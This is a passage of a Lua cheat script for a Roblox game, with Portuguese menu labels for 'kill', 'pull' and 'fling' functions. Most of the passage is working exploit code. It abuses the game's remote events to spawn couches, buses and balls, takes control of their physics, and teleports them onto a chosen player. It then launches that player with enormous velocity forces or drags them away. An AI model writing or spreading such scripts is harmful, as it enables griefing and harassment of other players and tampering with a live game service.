                      nextIndex = (nextIndex % #waypoints) + 1
                  end
                  local newPos = CFrame.new(startPos):lerp(CFrame.new(endPos), progress).p
                  currentRotation = currentRotation + rotationSpeed * dt
                  pCar:SetPrimaryPartCFrame(CFrame.new(newPos) * CFrame.Angles(0, currentRotation, 0))
              end)
          end)
      end
  })

  tab3:AddSection({ "Kill" })

  tab3:AddDropdown({
    Name = "Selecionar MÃ©todo (Matar/Puxar)",
    Description = "Escolha o mÃ©todo para matar ou puxar",
    Options = { "SofÃ¡", "Ã”nibus" },
    Callback = function(value9) v7 = value9 end,
  })

  function f4(p5)
    if not p5 or not p5.Character or not localPlayer2.Character then
      return
    end

    if not f20() then
      return
    end

    v3 = true
    position = localPlayer2.Character:FindFirstChild("HumanoidRootPart").Position
  end

  function f5(p6)
    if not p6 or not p6.Character or not localPlayer2.Character then
      return
    end

    local character2 = localPlayer2.Character
    local humanoid2 = character2:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart3 = character2:FindFirstChild("HumanoidRootPart")
    local v44, findFirstChild5, v45, v46

    if not humanoid2 or not humanoidRootPart3 then
      return
    else
      position2 = humanoidRootPart3.Position
      task.wait(0.5)
      f6()
      v44 = { "DeleteAllVehicles" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v44))
      end)

      v44 = { "PickingCar", "SchoolBus" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v44))
      end)

      task.wait(1)
      local vehicles = workspaceService:FindFirstChild("Vehicles")

      if not vehicles then
        return
      end

      findFirstChild5 = vehicles:FindFirstChild(localPlayer2.Name .. "Car")

      if not findFirstChild5 then
        return
      else
        pcall(function()
          humanoidRootPart3.Anchored = true
          humanoidRootPart3.CFrame = CFrame.new(Vector3.new(1171.15, 79.45, -1166.2))

          task.wait(0.2)

          humanoidRootPart3.Velocity = Vector3.zero
          humanoidRootPart3.RotVelocity = Vector3.zero
          humanoidRootPart3.Anchored = false

          humanoid2:ChangeState(Enum.HumanoidStateType.Seated)
        end)

        local v47 = tick()

        while true do
          task.wait()

          if tick() - v47 > 10 then
            break
          end

          if humanoid2.Sit then
            for index5, value10 in ipairs(findFirstChild5:GetDescendants()) do
              local v48 = value10

              if v48:IsA("BasePart") then
                v48.CanCollide = false
                pcall(function() v48:SetNetworkOwner(nil) end)
              end
            end

            v5 = true

            connect = runService.Stepped:Connect(function()
              if not v5 then
                return
              end

              for index6, value11 in ipairs(character2:GetDescendants()) do
                if value11:IsA("BasePart") then
                  value11.CanCollide = false
                end
              end
            end)

            v45 = tick()
            v46 = tick()

            connect2 = runService.Heartbeat:Connect(function()
              local humanoidRootPart4, vector, humanoidRootPart5

              if not v5 then
                return
              else
                local character3 = p6.Character or p6.CharacterAdded:Wait()
                humanoidRootPart4 = character3:FindFirstChild("HumanoidRootPart")
                local humanoid3 = character3:FindFirstChild("Humanoid")

                if not humanoidRootPart4 or not humanoid3 then
                  return
                end

                if not humanoidRootPart3 or not humanoid2 then
                  v5 = false
                  return
                elseif tick() - v45 < 0.05 then
                  return
                else
                  v45 = tick()
                  vector = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))

                  pcall(function()
                    findFirstChild5:PivotTo(CFrame.new(humanoidRootPart4.Position + vector) * CFrame.Angles(
                      math.rad(workspaceService.DistributedGameTime * 12000),
                      math.rad(workspaceService.DistributedGameTime * 15000),
                      math.rad(workspaceService.DistributedGameTime * 18000)
                    ))
                  end)

                  local v49 = false

                  for index7, value12 in ipairs(findFirstChild5:GetDescendants()) do
                    if (value12:IsA("Seat") or value12:IsA("VehicleSeat"))
                      and value12.Name ~= "VehicleSeat" then
                      if value12.Occupant == humanoid3 then
                        v49 = true
                        break
                      end
                    end
                  end

                  if v49 or tick() - v46 > 10 then
                    v5 = false

                    if connect then
                      connect:Disconnect()
                      connect = nil
                    end

                    if connect2 then
                      connect2:Disconnect()
                      connect2 = nil
                    end

                    pcall(function()
                      findFirstChild5:PivotTo(CFrame.new(Vector3.new(-76.6, -401.97, -84.26)))
                    end)

                    task.wait(0.5)
                    f6()

                    if character2 then
                      humanoidRootPart5 = character2:FindFirstChild("HumanoidRootPart")

                      if humanoidRootPart5 and position2 then
                        pcall(function()
                          humanoidRootPart5.Anchored = true
                          humanoidRootPart5.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                          task.wait(0.2)

                          humanoidRootPart5.Velocity = Vector3.zero
                          humanoidRootPart5.RotVelocity = Vector3.zero
                          humanoidRootPart5.Anchored = false

                          if humanoid2 then
                            humanoid2:ChangeState(Enum.HumanoidStateType.GettingUp)
                          end
                        end)
                      end
                    end

                    if character2 then
                      for index8, value13 in ipairs(character2:GetDescendants()) do
                        if value13:IsA("BasePart") then
                          value13.CanCollide = true
                          value13.Velocity = Vector3.zero
                          value13.RotVelocity = Vector3.zero
                        end
                      end
                    end

                    local humanoid4 = character2 and character2:FindFirstChild("Humanoid")

                    if humanoid4 then
                      humanoid4:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                    end

                    for index9, value14 in ipairs(workspaceService:GetDescendants()) do
                      if value14:IsA("Seat") or value14:IsA("VehicleSeat") then
                        value14.Disabled = false
                      end
                    end

                    pcall(function()
                      replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
                        "CharacterSizeUp", 1
                      )
                    end)
                  end

                  return
                end
              end
            end)

            return
          end
        end
        return
      end
    end
  end

  function f20()
    local backpack2 = localPlayer2:WaitForChild("Backpack")

    local couch2 = backpack2:FindFirstChild("Couch")
      or localPlayer2.Character:FindFirstChild("Couch")

    local v50, v51

    if not couch2 then
      v51 = { "PickingTools", "Couch" }

      if not pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(v51))
      end) then
        return false
      end

      local tentativas = 0
repeat
    couch2 = backpack2:FindFirstChild("Couch")
    task.wait(0.1)
    tentativas = tentativas + 1
until couch2 or tentativas >= 50

      if not couch2 then
        return false
      end

      if couch2.Parent ~= localPlayer2.Character then
        couch2.Parent = localPlayer2.Character
      end

      return true
    end

    if couch2.Parent ~= localPlayer2.Character then
      couch2.Parent = localPlayer2.Character
    end

    return true
  end

  function f21(p7)
    if not p7 or not p7.Character or not localPlayer2.Character then
      return
    end

    if not f20() then
      return
    end

    v4 = true
    position = localPlayer2.Character:FindFirstChild("HumanoidRootPart").Position
  end

  runService.Heartbeat:Connect(function()
    if (v3 or v4) and findFirstChild and localPlayer2.Character
      and localPlayer2.Character:FindFirstChild("HumanoidRootPart") and findFirstChild.Character
      and findFirstChild.Character:FindFirstChild("HumanoidRootPart") then
      pcall(function()
        localPlayer2.Character:SetPrimaryPartCFrame(CFrame.new(findFirstChild.Character.HumanoidRootPart.Position) * CFrame.Angles(
          math.rad(workspaceService.DistributedGameTime * 12000),
          math.rad(workspaceService.DistributedGameTime * 15000),
          math.rad(workspaceService.DistributedGameTime * 18000)
        ))
      end)
    end
  end)

  runService.Heartbeat:Connect(function()
    if (v3 or v4) and findFirstChild and findFirstChild.Character
      and findFirstChild.Character:FindFirstChild("Humanoid") then
      pcall(function()
        if findFirstChild.Character.Humanoid.Sit then
          if v3 then
            if localPlayer2.Character
              and localPlayer2.Character:FindFirstChild("HumanoidRootPart") then
              localPlayer2.Character:SetPrimaryPartCFrame(CFrame.new(0, -500, 0))
              task.wait(0.5)

              replicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(
                "PickingTools", "Couch"
              )

              task.wait(1)
            end
          end

          v3 = false
          v4 = false

          if localPlayer2.Character
            and localPlayer2.Character:FindFirstChild("HumanoidRootPart") and position then
            local humanoidRootPart6 = localPlayer2.Character:FindFirstChild("HumanoidRootPart")
            local humanoid5 = localPlayer2.Character:FindFirstChild("Humanoid")

            if humanoidRootPart6 then
              humanoidRootPart6.Anchored = true
              humanoidRootPart6.CFrame = CFrame.new(position + Vector3.new(0, 5, 0))

              task.wait(0.2)

              humanoidRootPart6.Velocity = Vector3.zero
              humanoidRootPart6.RotVelocity = Vector3.zero
              humanoidRootPart6.Anchored = false

              if humanoid5 then
                humanoid5:ChangeState(Enum.HumanoidStateType.GettingUp)
              end
            end

            position = nil
          end
        end
      end)
    end
  end)

  tab3:AddButton({
    Name = "Matar",
    Description = "Inicia o matar com o mÃ©todo selecionado",
    Callback = function()
      if v3 or v4 or v5 then
        return
      end

      if not findFirstChild or not v7 then
        return
      end

      if v7 == "SofÃ¡" then
        f4(findFirstChild)
      elseif v7 == "Ã”nibus" then
        f5(findFirstChild)
      end
    end,
  })

  tab3:AddButton({
    Name = "Puxar",
    Description = "Inicia o puxar com o mÃ©todo selecionado",
    Callback = function()
      if v3 or v4 or v5 then
        return
      end

      if not findFirstChild or not v7 or v7 ~= "SofÃ¡" then
        return
      end

      f21(findFirstChild)
    end,
  })

  tab3:AddButton({
    Name = "Parar (Matar ou Puxar)",
    Description = "Para o movimento de matar ou puxar",
    Callback = function()
      v3 = false
      v4 = false

      for index10, value15 in ipairs(localPlayer2.Character:GetDescendants()) do
        if value15:IsA("BasePart") then
          value15.CanCollide = true
          value15.Velocity = Vector3.zero
          value15.RotVelocity = Vector3.zero
        end
      end

      local humanoid6 = localPlayer2.Character:FindFirstChild("Humanoid")

      if humanoid6 then
        humanoid6:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
      end

      for index11, value16 in ipairs(workspaceService:GetDescendants()) do
        if value16:IsA("Seat") or value16:IsA("VehicleSeat") then
          value16.Disabled = false
        end
      end

      if position then
        local humanoidRootPart7 = localPlayer2.Character:FindFirstChild("HumanoidRootPart")

        if humanoidRootPart7 then
          humanoidRootPart7.Anchored = true
          humanoidRootPart7.CFrame = CFrame.new(position + Vector3.new(0, 5, 0))

          task.wait(0.2)

          humanoidRootPart7.Velocity = Vector3.zero
          humanoidRootPart7.RotVelocity = Vector3.zero
          humanoidRootPart7.Anchored = false

          if humanoid6 then
            humanoid6:ChangeState(Enum.HumanoidStateType.GettingUp)
          end
        end

        position = nil
      end

      f6()
      local v52 = { "DeleteAllVehicles" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v52))
      end)
    end,
  })

  tab3:AddSection({ " flings" })

  tab3:AddDropdown({
    Name = "Selecionar MÃ©todo de Fling",
    Description = "Escolha o mÃ©todo para aplicar fling",
    Options = { "SofÃ¡", "Ã”nibus", "Bola", "Bola V2", "Barco", "CaminhÃ£o" },
    Callback = function(value17) v8 = value17 end,
  })

  function f9()
    v5 = false

    if connect then
      connect:Disconnect()
      connect = nil
    end

    if connect2 then
      connect2:Disconnect()
      connect2 = nil
    end

    if findFirstChild2 then
      findFirstChild2.Anchored = v6.Anchored
      findFirstChild2.CanCollide = v6.CanCollide
      findFirstChild2.CanTouch = v6.CanTouch
    end

    if couch and couch:IsA("BasePart") then
      couch.Anchored = v6.Anchored
      couch.CanCollide = v6.CanCollide
      couch.CanTouch = v6.CanTouch
    end

    f6()
    task.wait(0.2)
    local character4 = localPlayer2.Character

    if character4 then
      for index12, value18 in ipairs(character4:GetDescendants()) do
        if value18:IsA("BasePart") then
          value18.CanCollide = true
          value18.Velocity = Vector3.zero
          value18.RotVelocity = Vector3.zero
        end
      end
    end

    local humanoid7 = character4 and character4:FindFirstChild("Humanoid")

    if humanoid7 then
      humanoid7:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
    end

    for index13, value19 in ipairs(workspaceService:GetDescendants()) do
      if value19:IsA("Seat") or value19:IsA("VehicleSeat") then
        value19.Disabled = false
      end
    end

    pcall(function()
      replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
        "CharacterSizeUp", 1
      )
    end)

    local humanoidRootPart8

    if position2 then
      humanoidRootPart8 = character4 and character4:FindFirstChild("HumanoidRootPart")

      if humanoidRootPart8 then
        pcall(function()
          humanoidRootPart8.Anchored = true
          humanoidRootPart8.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

          task.wait(0.2)

          humanoidRootPart8.Velocity = Vector3.zero
          humanoidRootPart8.RotVelocity = Vector3.zero
          humanoidRootPart8.Anchored = false

          if humanoid7 then
            humanoid7:ChangeState(Enum.HumanoidStateType.GettingUp)
          end
        end)
      end
    end
  end

  function f17(p12)
    if not p12 or not p12.Character or not localPlayer2.Character then
      return
    end

    local character5 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid8 = character5:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart9 = character5:FindFirstChild("HumanoidRootPart")

    if not humanoid8 or not humanoidRootPart9 then
      return
    end

    position2 = humanoidRootPart9.Position

    if not f20() then
      return
    end

    task.wait(0.5)
    couch = character5:FindFirstChild("Couch")

    if not couch then
      for index14, value20 in ipairs(workspaceService:GetDescendants()) do
        if (value20.Name == "Couch" or value20.Name == "Couch" .. localPlayer2.Name)
          and (value20:IsA("BasePart") or value20:IsA("Tool")) then
          couch = value20
          break
        end
      end
    end

    if not couch then
      return
    end

    if couch:IsA("BasePart") then
      v6 = {
        Anchored = couch.Anchored,
        CanCollide = couch.CanCollide,
        CanTouch = couch.CanTouch,
      }

      couch.Anchored = false
      couch.CanCollide = true
      couch.CanTouch = true

      pcall(function() couch:SetNetworkOwner(nil) end)
    end

    v5 = true

    connect = runService.Stepped:Connect(function()
      if not v5 then
        return
      end

      for index15, value21 in ipairs(character5:GetDescendants()) do
        if value21:IsA("BasePart") then
          value21.CanCollide = false
        end
      end
    end)

    local v55 = tick()
    local bodyVelocity = nil

    connect2 = runService.Heartbeat:Connect(function()
      if not v5 then
        return
      end

      local humanoidRootPart10, v56, connect5

      if not p12 or not p12.Character then
        v5 = false
        return
      else
        humanoidRootPart10 = p12.Character:FindFirstChild("HumanoidRootPart")
        local humanoid9 = p12.Character:FindFirstChild("Humanoid")

        if not humanoidRootPart10 or not humanoid9 then
          v5 = false
          return
        end

        if not humanoidRootPart9 or not humanoid8 then
          v5 = false
          return
        end

        pcall(function()
          character5:SetPrimaryPartCFrame(CFrame.new(humanoidRootPart10.Position) * CFrame.Angles(
            math.rad(workspaceService.DistributedGameTime * 12000),
            math.rad(workspaceService.DistributedGameTime * 15000),
            math.rad(workspaceService.DistributedGameTime * 18000)
          ))
        end)

        if humanoid9.Sit or tick() - v55 > 10 then
          v5 = false

          connect2:Disconnect()
          connect2 = nil

          for index16, value22 in ipairs(character5:GetDescendants()) do
            local v57 = value22

            if v57:IsA("BasePart") then
              v57.CanCollide = false
              pcall(function() v57:SetNetworkOwner(nil) end)
            end
          end

          bodyVelocity = Instance.new("BodyVelocity")
          bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

          bodyVelocity.Velocity = Vector3.new(math.random(-5, 5), 5, math.random(-5, 5)).Unit
              * 1000000
            + Vector3.new(0, 1000000, 0)

          bodyVelocity.Parent = humanoidRootPart9

          pcall(function()
            humanoidRootPart9.Anchored = true
            humanoidRootPart9.CFrame = CFrame.new(Vector3.new(-59599.73, 2040070.5, -293391.16))
            humanoidRootPart9.Anchored = false
          end)

          v56 = tick()

          connect5 = nil

          connect5 = runService.Heartbeat:Connect(function()
            if tick() - v56 >= 0.5 then
              connect5:Disconnect()
              return
            end

            pcall(function()
              character5:SetPrimaryPartCFrame(humanoidRootPart9.CFrame * CFrame.Angles(
                math.rad(workspaceService.DistributedGameTime * 12000),
                math.rad(workspaceService.DistributedGameTime * 15000),
                math.rad(workspaceService.DistributedGameTime * 18000)
              ))
            end)
          end)

          task.wait(0.5)

          pcall(function()
            humanoidRootPart9.Anchored = true
            humanoidRootPart9.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

            task.wait(0.2)

            humanoidRootPart9.Velocity = Vector3.zero
            humanoidRootPart9.RotVelocity = Vector3.zero
            humanoidRootPart9.Anchored = false

            if humanoid8 then
              humanoid8:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
          end)

          if bodyVelocity then
            bodyVelocity:Destroy()

            for index17, value23 in ipairs(character5:GetDescendants()) do
              if value23:IsA("BasePart") then
                value23.CanCollide = true
              end
            end
          end

          if ativarFlingAddToggle then
            ativarFlingAddToggle:Set(false)
          end
        end
      end
    end)
  end

  function f10(p13)
    if not p13 or not p13.Character or not localPlayer2.Character then
      return
    end

    local character6 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid10 = character6:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart11 = character6:FindFirstChild("HumanoidRootPart")
    local v58, findFirstChild6, v59, bodyVelocity2

    if not humanoid10 or not humanoidRootPart11 then
      return
    else
      position2 = humanoidRootPart11.Position
      task.wait(0.5)
      f6()
      v58 = { "DeleteAllVehicles" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v58))
      end)

      v58 = { "PickingCar", "SchoolBus" }

      pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v58))
      end)

      task.wait(1)
      local vehicles2 = workspaceService:FindFirstChild("Vehicles")

      if not vehicles2 then
        return
      end

      findFirstChild6 = vehicles2:FindFirstChild(localPlayer2.Name .. "Car")

      if not findFirstChild6 then
        return
      else
        pcall(function()
          humanoidRootPart11.Anchored = true
          humanoidRootPart11.CFrame = CFrame.new(Vector3.new(1171.15, 79.45, -1166.2))

          task.wait(0.2)

          humanoidRootPart11.Velocity = Vector3.zero
          humanoidRootPart11.RotVelocity = Vector3.zero
          humanoidRootPart11.Anchored = false

          humanoid10:ChangeState(Enum.HumanoidStateType.Seated)
        end)

        local v60 = tick()

        while true do
          task.wait()

          if tick() - v60 > 10 then
            break
          end

          if humanoid10.Sit then
            for index18, value24 in ipairs(findFirstChild6:GetDescendants()) do
              local v61 = value24

              if v61:IsA("BasePart") then
                v61.CanCollide = false
                pcall(function() v61:SetNetworkOwner(nil) end)
              end
            end

            v5 = true

            connect = runService.Stepped:Connect(function()
              if not v5 then
                return
              end

              for index19, value25 in ipairs(character6:GetDescendants()) do
                if value25:IsA("BasePart") then
                  value25.CanCollide = false
                end
              end
            end)

            v59 = tick()
            bodyVelocity2 = nil

            connect2 = runService.Heartbeat:Connect(function()
              if not v5 then
                return
              end

              local humanoidRootPart12, vector2, v62

              if not p13 or not p13.Character then
                v5 = false
                return
              else
                humanoidRootPart12 = p13.Character:FindFirstChild("HumanoidRootPart")
                local humanoid11 = p13.Character:FindFirstChild("Humanoid")

                if not humanoidRootPart12 or not humanoid11 then
                  v5 = false
                  return
                end

                if not humanoidRootPart11 or not humanoid10 then
                  v5 = false
                  return
                else
                  vector2 = Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))

                  pcall(function()
                    findFirstChild6:PivotTo(CFrame.new(humanoidRootPart12.Position + vector2) * CFrame.Angles(
                      math.rad(workspaceService.DistributedGameTime * 12000),
                      math.rad(workspaceService.DistributedGameTime * 15000),
                      math.rad(workspaceService.DistributedGameTime * 18000)
                    ))
                  end)

                  local v63 = false

                  for index20, value26 in ipairs(findFirstChild6:GetDescendants()) do
                    if (value26:IsA("Seat") or value26:IsA("VehicleSeat"))
                      and value26.Name ~= "VehicleSeat" then
                      if value26.Occupant == humanoid11 then
                        v63 = true
                        break
                      end
                    end
                  end

                  if v63 or tick() - v59 > 10 then
                    v5 = false

                    connect2:Disconnect()
                    connect2 = nil

                    bodyVelocity2 = Instance.new("BodyVelocity")
                    bodyVelocity2.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                    bodyVelocity2.Velocity = Vector3.new(
                      math.random(-5, 5), 5, math.random(-5, 5)
                    ).Unit * 1000000 + Vector3.new(0, 1000000, 0)

                    bodyVelocity2.Parent = humanoidRootPart11

                    task.wait(0.5)
                    f6()
                    v62 = { "DeleteAllVehicles" }

                    pcall(function()
                      replicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(v62))
                    end)

                    if bodyVelocity2 then
                      bodyVelocity2:Destroy()

                      for index21, value27 in ipairs(character6:GetDescendants()) do
                        if value27:IsA("BasePart") then
                          value27.CanCollide = true
                        end
                      end
                    end

                    pcall(function()
                      humanoidRootPart11.Anchored = true
                      humanoidRootPart11.CFrame = CFrame.new(position2 + Vector3.new(0, 5, 0))

                      task.wait(0.2)

                      humanoidRootPart11.Velocity = Vector3.zero
                      humanoidRootPart11.RotVelocity = Vector3.zero
                      humanoidRootPart11.Anchored = false

                      if humanoid10 then
                        humanoid10:ChangeState(Enum.HumanoidStateType.GettingUp)
                      end
                    end)

                    if ativarFlingAddToggle then
                      ativarFlingAddToggle:Set(false)
                    end
                  end
                  return
                end
              end
            end)
            return
          end
        end
      end
    end
  end

  function f11(p14)
    local v64 = not p14
    local v65, v66

    if v64 or not p14.Character then
      return
    else
      local character7 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
      local humanoid12 = character7:FindFirstChildOfClass("Humanoid")
      local v67 = not humanoid12
      local humanoidRootPart13 = character7:FindFirstChild("HumanoidRootPart")

      if v67 or not humanoidRootPart13 then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v65 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v65))
        end)

        local workspaceCom = workspaceService:FindFirstChild("WorkspaceCom")

        if not workspaceCom then
          return
        else
          local findFirstChild7 = workspaceCom:FindFirstChild("001_SoccerBalls")

          if not findFirstChild7 then
            return
          end

          findFirstChild2 = findFirstChild7:FindFirstChild("Soccer" .. localPlayer2.Name)

          if not findFirstChild2 then
            return
          end

          v6 = {
            Anchored = findFirstChild2.Anchored,
            CanCollide = findFirstChild2.CanCollide,
            CanTouch = findFirstChild2.CanTouch,
          }

          findFirstChild2.Anchored = false
          findFirstChild2.CanCollide = true
          findFirstChild2.CanTouch = true

          pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
          position2 = humanoidRootPart13.Position

          for index22, value28 in ipairs(character7:GetDescendants()) do
            if value28:IsA("BasePart") then
              value28.CanCollide = false
            end
          end

          if humanoid12 then
            humanoid12:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            humanoid12.Sit = false
          end

          for index23, value29 in ipairs(workspaceService:GetDescendants()) do
            if value29:IsA("Seat") or value29:IsA("VehicleSeat") then
              value29.Disabled = true
            end
          end

          pcall(function()
            replicatedStorage:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer(
              "CharacterSizeDown", 4
            )
          end)

          v5 = true
          v66 = 0

          connect = runService.Heartbeat:Connect(function()
            if not v5 or not p14.Character then
              return
            else
              local humanoidRootPart14 = p14.Character:FindFirstChild("HumanoidRootPart")
              local humanoid13 = p14.Character:FindFirstChild("Humanoid")
              local character8 = localPlayer2.Character
              local v68 = not humanoidRootPart14
              local humanoidRootPart15 = character8:FindFirstChild("HumanoidRootPart")

              if v68 or not humanoid13 or not humanoidRootPart15 then
                return
              else
                local moveDirection = humanoid13.MoveDirection
                local v69 = moveDirection.Magnitude < 0.1

                if humanoid13.Sit then
                  local v70 = tick()
                  local v71 = math.sin(v70 * 50)

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart14.Position
                    + Vector3.new(0, 0.75 + v71 * 2, 0))
                elseif v69 then
                  local v72 = tick()
                  local v73 = math.sin(v72 * 50)

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart14.Position
                    + Vector3.new(0, 0.75, v73 * 3))
                else
                  local v74 = math.clamp(humanoidRootPart14.Velocity.Magnitude * 0.15, 5, 12)

                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart14.Position
                    + moveDirection.Unit * v74 + Vector3.new(0, 0.75, 0))
                end

                humanoidRootPart15.CFrame = CFrame.new(findFirstChild2.Position
                  + Vector3.new(0, 1, 0))
                return
              end
            end
          end)

          connect2 = runService.Heartbeat:Connect(function()
            local v75 = not v5
            local bodyVelocity3

            if v75 or not p14.Character then
              return
            else
              local humanoidRootPart16 = p14.Character:FindFirstChild("HumanoidRootPart")

              if not humanoidRootPart16 then
                return
              end

              if (findFirstChild2.Position - humanoidRootPart16.Position).Magnitude < 4
                and tick() - v66 > 0.4 then
                v66 = tick()

                for index24, value30 in ipairs(p14.Character:GetDescendants()) do
                  if value30:IsA("BasePart") then
                    value30.CanCollide = false
                  end
                end

                bodyVelocity3 = Instance.new("BodyVelocity")
                bodyVelocity3.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                bodyVelocity3.Velocity = Vector3.new(
                  math.random(-5, 5), 5, math.random(-5, 5)
                ).Unit * 500000 + Vector3.new(0, 250000, 0)

                bodyVelocity3.Parent = humanoidRootPart16

                task.delay(0.3, function()
                  bodyVelocity3:Destroy()

                  for index25, value31 in ipairs(p14.Character:GetDescendants()) do
                    if value31:IsA("BasePart") then
                      value31.CanCollide = true
                    end
                  end
                end)
              end
              return
            end
          end)
        end
      end
    end
  end

  function f22()
    local backpack2 = localPlayer2:WaitForChild("Backpack")

    local soccerBall = backpack2:FindFirstChild("SoccerBall")
      or localPlayer2.Character:FindFirstChild("SoccerBall")

    local v76, v77

    if not soccerBall then
      v77 = { "PickingTools", "SoccerBall" }

      if not pcall(function()
        replicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(v77))
      end) then
        return false
      end

      repeat
        soccerBall = backpack2:FindFirstChild("SoccerBall")
        task.wait()

        v76 = soccerBall
        v76 = soccerBall or task.wait(5)
      until v76

      if not soccerBall then
        return false
      end

      if soccerBall.Parent ~= localPlayer2.Character then
        soccerBall.Parent = localPlayer2.Character
      end

      return true
    end

    if soccerBall.Parent ~= localPlayer2.Character then
      soccerBall.Parent = localPlayer2.Character
    end

    return true
  end

  function f12(p15)
    local v78 = not p15
    local v79, v80

    if v78 or not p15.Character then
      return
    else
      local humanoidRootPart17 = (localPlayer2.Character
        or localPlayer2.CharacterAdded:Wait()):FindFirstChild("HumanoidRootPart")

      if not humanoidRootPart17 then
        return
      elseif not f22() then
        return
      else
        task.wait(0.5)
        v79 = { "PlayerWantsToDeleteTool", "SoccerBall" }

        pcall(function()
          replicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(v79))
        end)

        local workspaceCom2 = workspaceService:FindFirstChild("WorkspaceCom")

        if not workspaceCom2 then
          return
        else
          local findFirstChild8 = workspaceCom2:FindFirstChild("001_SoccerBalls")

          if not findFirstChild8 then
            return
          end

          findFirstChild2 = findFirstChild8:FindFirstChild("Soccer" .. localPlayer2.Name)

          if not findFirstChild2 then
            return
          end

          v6 = {
            Anchored = findFirstChild2.Anchored,
            CanCollide = findFirstChild2.CanCollide,
            CanTouch = findFirstChild2.CanTouch,
          }

          findFirstChild2.Anchored = false
          findFirstChild2.CanCollide = true
          findFirstChild2.CanTouch = true

          pcall(function() findFirstChild2:SetNetworkOwner(nil) end)
          position2 = humanoidRootPart17.Position
          v5 = true
          v80 = 0

          connect = runService.Heartbeat:Connect(function()
            local v81 = not v5
            local humanoidRootPart18, vector3

            if v81 or not p15.Character then
              return
            else
              humanoidRootPart18 = p15.Character:FindFirstChild("HumanoidRootPart")
              local humanoid14 = p15.Character:FindFirstChild("Humanoid")

              if not humanoidRootPart18 or not humanoid14 then
                return
              else
                local magnitude = humanoidRootPart18.Velocity.Magnitude
                local v82 = humanoid14.MoveDirection.Magnitude > 0.05
                local v83 = humanoid14:GetState() == Enum.HumanoidStateType.Jumping
                vector3 = nil

                if v82 or v83 then
                  local v84 = math.clamp(magnitude / 1.5, 6, 15)
                  vector3 = humanoidRootPart18.CFrame.LookVector * v84 + Vector3.new(0, 1, 0)
                else
                  local v85 = tick()
                  local v86 = math.sin(v85 * 25)
                  local v87 = tick()
                  local v88 = math.cos(v87 * 20)
                  vector3 = Vector3.new(v88 * 1.5, 1, v86 * 4)
                end

                pcall(function()
                  findFirstChild2.CFrame = CFrame.new(humanoidRootPart18.Position + vector3)
                  findFirstChild2.AssemblyLinearVelocity = Vector3.new(9999, 9999, 9999)
                end)
                return
              end
            end
          end)

          connect2 = runService.Heartbeat:Connect(function()
            local v89 = not v5
            local bodyVelocity4

            if v89 or not p15.Character then
              return
            else
              local humanoidRootPart19 = p15.Character:FindFirstChild("HumanoidRootPart")

              if not humanoidRootPart19 then
                return
              end

              if (findFirstChild2.Position - humanoidRootPart19.Position).Magnitude < 4
                and tick() - v80 > 0.4 then
                v80 = tick()

                for index26, value32 in ipairs(p15.Character:GetDescendants()) do
                  if value32:IsA("BasePart") then
                    value32.CanCollide = false
                  end
                end

                bodyVelocity4 = Instance.new("BodyVelocity")
                bodyVelocity4.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

                bodyVelocity4.Velocity = Vector3.new(
                  math.random(-5, 5), 5, math.random(-5, 5)
                ).Unit * 500000 + Vector3.new(0, 250000, 0)

                bodyVelocity4.Parent = humanoidRootPart19

                task.delay(0.3, function()
                  bodyVelocity4:Destroy()

                  for index27, value33 in ipairs(p15.Character:GetDescendants()) do
                    if value33:IsA("BasePart") then
                      value33.CanCollide = true
                    end
                  end
                end)
              end
              return
            end
          end)
        end
      end
    end
  end

  function f13(p16)
    if not p16 or not p16.Character or not localPlayer2.Character then
      return
    end

    local character9 = localPlayer2.Character or localPlayer2.CharacterAdded:Wait()
    local humanoid15 = character9:FindFirstChildOfClass("Humanoid")
    local humanoidRootPart20 = character9:FindFirstChild("HumanoidRootPart")
    local findFirstChild9, v90

    if not humanoid15 or not humanoidRootPart20 then
      return
    else
      position2 = humanoidRootPart20.Position
      f6()

      task.wait(0.4)
      task.wait(1.5)

      local vehicles3 = workspaceService:FindFirstChild("Vehicles")

      if not vehicles3 then
        return
      else
